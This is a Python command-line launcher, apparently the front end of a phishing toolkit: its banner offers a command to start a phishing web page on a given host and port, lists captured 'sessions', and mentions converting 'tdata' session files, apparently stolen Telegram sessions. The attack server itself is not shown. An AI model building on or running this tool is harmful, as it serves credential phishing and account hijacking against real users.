import os
import sys
import time
import subprocess
import argparse

cur_dir = os.getcwd()

"""   Preference   """
r = "\033[31m"
g = "\033[32m"
y = "\033[33m"
b = "\033[34m"
f = "\033[35m"
d = "\033[0m"

terminal_width = os.get_terminal_size().columns
# Clear Terminal
def clear_terminal():
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system("clear")


"""   Tools   """
## sessions
def session_list():
    lst = os.listdir("sessions/")
    print("\n*- - - - - - - - - -*\n")
    for a in lst:
        print(f"{a}")
        time.sleep(0.04)
## server
def server(host, port):
    banner = r"""
          ,-.
      O  /   `.
      <\/      `.
       |*        `.
      / \          `.
     /  /            `>')3s,
--------.                 ,'
 sciy  /                 7
  
    """
    time.sleep(0.5)
    print(banner)
    subprocess.run(["python3", f"server.py", "-u", host, "-p", str(port)])


"""  Shell interpritator  """




banner= f"""{f}
 ::::::::   :::::::: ::::::::::: :::   :::
:+:    :+: :+:    :+:     :+:   :+:
+:+        +:+           +:+      +:+ +:+
+#++:++#++ +#+           +#+       +#++:
       +#+ +#+           +#+        +#+
#+#    #+# #+#    #+#    #+#        #+#
 ########   ######## ###########    ###

phishing -u <host> -p <port> -- to start phishing web page

sessions -- print sessions
c -- clear terminal
e -- exit terminal
convert tdata <session_name> -- (! revoked, using in newset version){d}

"""

print(banner)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Server preference')
    parser.add_argument('-u', type=str, help='Host handler')
    parser.add_argument('-p', type=int, help='Port handler')
    args = parser.parse_args()

    host = args.u
    port = args.p
    if host and port:
      server(host, port)
    else:
        print("")

